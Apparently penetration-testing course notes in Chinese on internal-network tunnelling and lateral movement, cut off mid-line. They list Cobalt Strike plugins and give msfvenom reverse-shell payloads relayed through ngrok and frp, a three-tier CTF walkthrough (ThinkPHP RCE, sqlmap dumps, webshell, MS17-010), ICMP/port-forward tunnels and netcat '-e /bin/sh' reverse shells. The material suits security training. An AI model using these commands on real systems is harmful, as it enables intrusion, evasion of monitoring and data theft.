<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CS插件</span></span><br><span class="line">kerberoast：https://github.com/nidem/kerberoast</span><br><span class="line">taowu-cobalt-strike（插件-小迪精选）：https://github.com/pandasec888/taowu-cobalt-strike</span><br><span class="line">Cobalt Strike <span class="number">4.0</span>手册：https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q 提取码：dtm2</span><br><span class="line">红队实战演练环境：https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug 提取码：taqu</span><br><span class="line">Erebus（插件-小迪使用）：https://github.com/DeEpinGh0st/Erebus</span><br><span class="line">（Cobalt Strike插件）：https://github.com/rsmudge/Elevatekit</span><br><span class="line">（Cobalt Strike插件）：https://github.com/harleyQu1nn/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/bluscreenofjeff/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/michalkoczwara/aggressor_scripts_collection</span><br><span class="line">（Cobalt Strike插件）：https://github.com/vysecurity/Aggressor-VYSEC</span><br><span class="line">（Cobalt Strike插件）：https://github.com/killswitch-GUI/CobaltStrike-ToolKit</span><br><span class="line">（Cobalt Strike插件）：https://github.com/ramen0x3f/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/FortyNorthSecurity/AggressorAssessor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/persistence-aggressor-script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/aggressor-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/branthale/CobaltStrikeCNA</span><br><span class="line">（Cobalt Strike插件）：https://github.com/gaudard/scripts/tree/master/red-team/aggressor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/001SPARTaN/aggressor_scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/Und3rf10w/Aggressor-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/rasta-mouse/Aggressor-Script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/vysec/Aggressor-VYSEC</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/aggressor-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/red-team-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/vysecurity/CVE-<span class="number">2018</span>-<span class="number">4878</span></span><br><span class="line">（Cobalt Strike插件）：https://github.com/harleyQu1nn/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/bluscreenofjeff/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/QAX-A-Team/CobaltStrike-Toolset</span><br><span class="line">（Cobalt Strike插件）：https://github.com/ars3n11/Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/michalkoczwara/aggressor_scripts_collection</span><br><span class="line">（Cobalt Strike插件）：https://github.com/killswitch-GUI/CobaltStrike-Toolkit</span><br><span class="line">（Cobalt Strike插件）：https://github.com/ZonkSec/persistence-aggressor-script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/rasta-mouse/Aggressor-Script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/RhinoSecurityLabs/Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/Kevin-Robertson/Inveigh</span><br><span class="line">（Cobalt Strike插件）：https://github.com/Genetic-Malware/Ebowla</span><br><span class="line">（Cobalt Strike插件）：https://github.com/001SPARTaN/aggressor_scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/gaudard/scripts/tree/master/red-team/aggressor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/branthale/CobaltStrikeCNA</span><br><span class="line">（Cobalt Strike插件）：https://github.com/oldb00t/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/p292/Phant0m_cobaltstrike</span><br><span class="line">（Cobalt Strike插件）：https://github.com/p292/DDEAutoCS</span><br><span class="line">（Cobalt Strike插件）：https://github.com/secgroundzero/CS-Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/skyleronken/Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/tevora-threat/aggressor-powerview</span><br><span class="line">（Cobalt Strike插件）：https://github.com/tevora-threat/PowerView3-Aggressor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/persistence-aggressor-script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/FortyNorthSecurity/AggressorAssessor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/mdsecactivebreach/CACTUSTORCH</span><br><span class="line">（Cobalt Strike插件）：https://github.com/C0axx/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/offsecginger/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/tomsteele/cs-magik</span><br><span class="line">（Cobalt Strike插件）：https://github.com/bitsadmin/nopowershell</span><br><span class="line">（Cobalt Strike插件）：https://github.com/SpiderLabs/SharpCompile</span><br></pre></td></tr></table></figure>



<h3 id="day70-域横向内网漫游Socks代理隧道技术"><a href="#day70-域横向内网漫游Socks代理隧道技术" class="headerlink" title="day70 域横向内网漫游Socks代理隧道技术"></a>day70 域横向内网漫游Socks代理隧道技术</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">必要基础知识点</span><br><span class="line">	<span class="number">1.</span>内外网简单知识</span><br><span class="line">	<span class="number">2.</span>内网<span class="number">1</span>和内网<span class="number">2</span>通信问题</span><br><span class="line">		可以用代理解决</span><br><span class="line">	<span class="number">3.</span>正向反向协议通信连接问题</span><br><span class="line">		正向:指正方向连接，控制端连接被控制端</span><br><span class="line">		反向:...</span><br><span class="line">			假如控制端是公网，被控是内网，可以让被控端去找控制端</span><br><span class="line">	<span class="number">4.</span>内网穿透代理隧道技术说明</span><br><span class="line">		隧道主要是解决流量分析工具，流量监控工具，防火墙相关过滤</span><br><span class="line">		代理主要解决网络连通性问题</span><br><span class="line"></span><br><span class="line">代理工具</span><br><span class="line">	frp ngrok reGeorg sockscap64 earthworm proxifier proxychains</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例1	内网穿透Ngrok测试演示-两个内网通讯上线		现在需要实名</span></span><br><span class="line"><span class="number">1.</span>注册-购买-填写-确认http://www.ngrok.cc/</span><br><span class="line">	协议:http 本地端口<span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">2.</span>测试：内网<span class="number">1</span>执行后门-免费主机处理-内网<span class="number">2</span>监听-内网<span class="number">2</span>接收器(攻击机)</span><br><span class="line">	sunny为下载的客户端 区分win和linux 在官网</span><br><span class="line">	./sunny clientid <span class="built_in">id</span>		<span class="comment">#id在网站隧道管理那里</span></span><br><span class="line">    msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=<span class="number">80</span> -f exe -o test.exe		<span class="comment">#80是因为http走80	xiaodisec.free.idcfengye.com开通后给的</span></span><br><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">    <span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span></span><br><span class="line">    <span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">    exploit</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例2	frp自建跳板测试 两个内网通讯上线</span></span><br><span class="line">自行搭建，方便修改，成本低，使用多样化</span><br><span class="line"><span class="number">1.</span>服务端-下载-解压-修改-启动	(阿里云主机须修改安全组配置出入口)</span><br><span class="line">服务器修改配置文件frps.ini</span><br><span class="line">	[common]</span><br><span class="line">	bind_port = <span class="number">6677</span></span><br><span class="line">./frps -c ./frps.ini		<span class="comment">#启动服务端</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>控制端-下载-解压-修改-启动</span><br><span class="line">	[common]</span><br><span class="line">    server_addr=云主机ip</span><br><span class="line">    server_port=<span class="number">6677</span>		<span class="comment">#同上</span></span><br><span class="line">    [msf]</span><br><span class="line">    <span class="built_in">type</span> = tcp</span><br><span class="line">    local_ip = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    local_port = <span class="number">5555</span></span><br><span class="line">    remote_port=<span class="number">6000</span>		<span class="comment">#	服务端该端口须开启防火墙</span></span><br><span class="line">./frpc -c ./frpc.ini	<span class="comment">#开启客户端</span></span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=公网ip lport=<span class="number">6000</span> -f exe -o frp.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">5555</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">靶机运行frp</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例3	CFS三层内网漫游安全测试演练-某CTF线下2019</span></span><br><span class="line">每台服务器一个flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#	target1</span></span><br><span class="line">web漏洞thinkphp5.x_rce 用工具使用对应exp写入后门</span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> LPORT=<span class="number">1111</span> -f elf &gt;t1.elf</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">1111</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"><span class="comment">#	信息收集</span></span><br><span class="line">探索内网并添加路由，从而发现和联系上内网</span><br><span class="line">获取网络接口: run get_local_subnets</span><br><span class="line">查看路由地址: run autoroute -p</span><br><span class="line">添加路由地址:	run autoroute -s <span class="number">192.168</span><span class="number">.22</span><span class="number">.0</span>/<span class="number">24</span>				<span class="comment">#这一步msf会话中kali可以访问到2级内网</span></span><br><span class="line">在target1上创建代理</span><br><span class="line">开启本地代理:</span><br><span class="line">    use auxiliary/server/socks4a			socks_proxy	</span><br><span class="line">    <span class="built_in">set</span> srvport <span class="number">2222</span>						<span class="comment">#把访问内网的功能映射到kali的2222端口</span></span><br><span class="line">    exploit</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	利用本地代理接口访问测试</span></span><br><span class="line">linux</span><br><span class="line">    配置proxychains后调用探针target2</span><br><span class="line">    /etc/proxychains.conf						/etc/proxychains4.conf</span><br><span class="line">    	socks4 <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> <span class="number">2222</span>				socks5</span><br><span class="line">    proxychains4 curl cip.cc				<span class="comment">#进行测试</span></span><br><span class="line">    proxychains4 nmap -sT -Pn <span class="number">192.168</span><span class="number">.22</span><span class="number">.0</span>/<span class="number">24</span> -p80</span><br><span class="line">        -Pn 不适用ping扫描，不执行主机发现，默认目标主机是存活的，可以绕开防火墙</span><br><span class="line">        -sT 使用TCP连接，与目标三次握手，来确定端口是否开放</span><br><span class="line">windows</span><br><span class="line">	利用代理工具Proxifier(全局)或SocksCap64(可选择应用)载入进行进程访问测试</span><br><span class="line">工具</span><br><span class="line">	为了顺利访问到Target2的网页，需要设置浏览器代理进行访问</span><br><span class="line">    其他工具也需要设置代理</span><br><span class="line">    火狐设置代理	socks5</span><br><span class="line"></span><br><span class="line">msf中把会话放入后台 background</span><br><span class="line">	返回上级目录 back</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	target2</span></span><br><span class="line">注入</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>				<span class="comment">#sql注入</span></span><br><span class="line">    <span class="number">1.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> --dbs</span><br><span class="line">	<span class="number">2.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> -D bagecms --tables </span><br><span class="line">	<span class="number">3.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> -D begacms -T bage_admin --columns</span><br><span class="line">	<span class="number">4.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> -D begacms -T bage_admin -C username,password --dump</span><br><span class="line"></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span>/index.php?r=admini/public/login    	<span class="comment">#后台</span></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span>/index.php?r=special                	<span class="comment">#模板写入后门shell</span></span><br><span class="line">通过robots.txt找到后台登录地址，通过后台功能拿webshell</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>生成正向后门</span><br><span class="line">	msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<span class="number">3333</span> -f elf &gt; t2.elf</span><br><span class="line"><span class="number">2.</span>监听</span><br><span class="line">	use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">    <span class="built_in">set</span> rhost <span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span></span><br><span class="line">    <span class="built_in">set</span> LPORT <span class="number">3333</span></span><br><span class="line">    exploit</span><br><span class="line"><span class="number">3.</span>信息收集配置访问</span><br><span class="line">获取网络接口: run get_local_subnets</span><br><span class="line">查看路由地址: run autoroute -p</span><br><span class="line">添加路由地址: run autoroute -s <span class="number">192.168</span><span class="number">.33</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"><span class="number">4.</span>利用本地代理接口访问测试</span><br><span class="line"></span><br><span class="line"><span class="comment">#	target3</span></span><br><span class="line">漏洞利用，找到flag</span><br><span class="line">proxychains nmap -Pn -sT <span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span></span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span></span><br><span class="line">exploit</span><br><span class="line">shell</span><br><span class="line"><span class="built_in">dir</span> /S flag.txt /B</span><br><span class="line"><span class="built_in">type</span> xxxxx.txt</span><br></pre></td></tr></table></figure>

<h3 id="day71-内网安全-域横向网络-amp-传输-amp-应用层隧道技术"><a href="#day71-内网安全-域横向网络-amp-传输-amp-应用层隧道技术" class="headerlink" title="day71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术"></a>day71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">必备知识点</span><br><span class="line">	<span class="number">1.</span>代理和隧道技术区别</span><br><span class="line">		代理可以解决访问问题，从一个局域网访问另一个局域网</span><br><span class="line">		隧道会重新封装数据包，将需要发送的数据包打包进新的数据包内，然后发送这个新数据包，在网络终点将数据解包并转发到最终目的地。</span><br><span class="line">		注意隧道技术指的是包括数据封装、传输和解包在内的全过程。</span><br><span class="line">		隧道提供保密性和安全性，可以绕过边界设备和防火墙等检测设备。隧道技术的代表有VPN</span><br><span class="line">	<span class="number">2.</span>隧道技术为了解决什么？</span><br><span class="line">		在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截</span><br><span class="line">		CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</span><br><span class="line">	<span class="number">3.</span>隧道技术前期的必备条件</span><br><span class="line">		已获得一定的控制权，但是不能对控制的东西进行信息收集或者执行它上面的东西在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等。</span><br><span class="line">        在实际网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。</span><br><span class="line">        隧道 即一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</span><br><span class="line">	</span><br><span class="line"><span class="comment">#	常用隧道技术以下3种</span></span><br><span class="line">	<span class="number">1.</span>网络层:IPV6隧道、ICMP隧道</span><br><span class="line">	<span class="number">2.</span>传输层：TCP、UDP、端口转发</span><br><span class="line">	<span class="number">3.</span>应用层：SSH、HTTP/S、DNS</span><br><span class="line"></span><br><span class="line"><span class="comment">#	网络传输应用层检测连通性-检测</span></span><br><span class="line">在使用隧道协议前，需要确定网络是否正常通讯 是否能使用这个协议</span><br><span class="line"><span class="number">1.</span>TCP协议</span><br><span class="line">	瑞士军刀netcat 		nc &lt;IP&gt; &lt;端口&gt;</span><br><span class="line"><span class="number">2.</span>HTTP协议</span><br><span class="line">	curl &lt;ip:端口&gt;</span><br><span class="line"><span class="number">3.</span>ICMP协议</span><br><span class="line">	ping &lt;ip/域名&gt;</span><br><span class="line"><span class="number">4.</span>dns协议</span><br><span class="line">	检测DNS连通性常用命令nslookup和dig</span><br><span class="line">	nslookup是windows自带的DNS探测命令</span><br><span class="line">	dig是Linux...</span><br><span class="line">	</span><br><span class="line"><span class="comment">#	网络层ICMP隧道ptunnel使用-检测，利用</span></span><br><span class="line">pingtunnel是tcp/udp/sock5流量伪装成icmp流量进行转发的工具</span><br><span class="line">	-p 标识连接icmp隧道另一端的机器ip(目标服务器)</span><br><span class="line">	-lp 标识需要监听的本地tcp端口</span><br><span class="line">	-da 指定需要转发的本地tcp端口</span><br><span class="line">	-dp 执行需要转发的机器IP(即目标内网某一机器的内网ip)</span><br><span class="line">	-x 设置连接的密码</span><br><span class="line">在中介机webserver执行</span><br><span class="line">	./ptunnel -x 密码</span><br><span class="line">	./ptunnel -x xiaodi</span><br><span class="line">在攻击机hacker xiaodi执行:</span><br><span class="line">	./ptunnel -p [中介机] -lp [本机端口] -da [被攻击机] -dp [被攻击端口] -x [密码]</span><br><span class="line">	./ptunnel -p <span class="number">192.168</span><span class="number">.76</span><span class="number">.150</span> -lp <span class="number">1080</span> -da <span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span> -dp <span class="number">3389</span> -x xiaodi</span><br><span class="line">当<span class="number">192.168</span><span class="number">.76</span><span class="number">.150</span>(p)收到来自<span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span>(da)的<span class="number">3389</span>端口(dp)数据时，发送到本机(攻击机)的<span class="number">1080</span>端口(lp).反之依然(二者之间建立隧道)</span><br><span class="line">	rdesktop [IP] [端口]</span><br><span class="line">	rdesktop <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br><span class="line">调用远程桌面访问本地<span class="number">1080</span>，也就是目标机的<span class="number">3389</span></span><br><span class="line">老版本介绍	https://github.com/f1vefour/ptunnel(需自行编译)</span><br><span class="line">新版本介绍	https://github.com/esrrhs/pingtunnel(二次开发版)</span><br><span class="line"></span><br><span class="line"><span class="comment">#	传输层转发隧道Portmap使用-检测，利用</span></span><br><span class="line">win:	lck</span><br><span class="line">linux:	portmap</span><br><span class="line">被攻击机:	lck-slave [中介机ip] <span class="number">3131</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br><span class="line"> 	将(被攻击机)本地<span class="number">3389</span>跟中介机<span class="number">3131</span>建立隧道</span><br><span class="line">在中介机上:</span><br><span class="line">    lck -listen [本机端口] [攻击机端口]</span><br><span class="line">    lck -listen <span class="number">3131</span> <span class="number">3333</span></span><br><span class="line">    监听<span class="number">3131</span>转发到<span class="number">3333</span></span><br><span class="line">攻击机上:</span><br><span class="line">    rdesktop [中介机ip]:<span class="number">3333</span></span><br><span class="line">    远程连接</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	传输层转发隧道Netcat使用-检测，利用，功能</span></span><br><span class="line">要确定为是否为最新版本，老版本不支持-e写法</span><br><span class="line">linux自带nc</span><br><span class="line">受害主机能找到攻击机就用正向，不能则用反向</span><br><span class="line"><span class="number">1.</span>双向连接反弹shell</span><br><span class="line">	正向:	攻击连接受害</span><br><span class="line">        受害</span><br><span class="line">            nc -ldp <span class="number">1234</span> -e /<span class="built_in">bin</span>/sh				//linux</span><br><span class="line">            nc -ldp <span class="number">1234</span> -e c:\windows\system32\cmd.exe		<span class="comment">#win</span></span><br><span class="line">     		将命令行界面(shell/cmd)推到<span class="number">1234</span>端</span><br><span class="line">        攻击</span><br><span class="line">        	nc <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> <span class="number">1234</span></span><br><span class="line">        	主动连接</span><br><span class="line">	反向：受害连接攻击</span><br><span class="line">    	攻击</span><br><span class="line">        	nc -lvp <span class="number">1234</span></span><br><span class="line">            监听<span class="number">1234</span>端口</span><br><span class="line">        受害</span><br><span class="line">        	nc [攻击机ip] <span class="number">1234</span> -e /<span class="built_in">bin</span>/sh</span><br><span class="line">            nc [攻击机ip] <span class="number">1234</span> -e c:\windows\system32\cmd.exe</span><br><span class="line">            命令行界面(cmd/shell)推到攻击机ip的<span class="number">1234</span>端</span><br><span class="line"><span class="number">2.</span>多向连接反弹shell-配合转发</span><br><span class="line">反向:</span><br><span class="line">    god\Webserver:</span><br><span class="line">        Lcx.exe -listen <span class="number">2222</span> <span class="number">3333</span></span><br><span class="line">    god\Sqlserver:</span><br><span class="line">		nc <span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> <span class="number">2222</span> -e c:\windows\system32\cmd.exe</span><br><span class="line">    kali:</span><br><span class="line">        nc -v <span class="number">192.168</span><span class="number">.76</span><span class="number">.143</span> <span class="number">3333</span></span><br><span class="line">    SQL服务器将自己的cmd映射到网络服务器的<span class="number">2222</span>端口，网络服务器再将<span class="number">2222</span>映射到自己的<span class="number">3333</span>端口，最后由攻击机访问</span><br><span class="line"><span class="number">3.</span>相关netcat主要功能测试</span><br><span class="line">指纹服务	nc -nv <span class="number">192.168</span><span 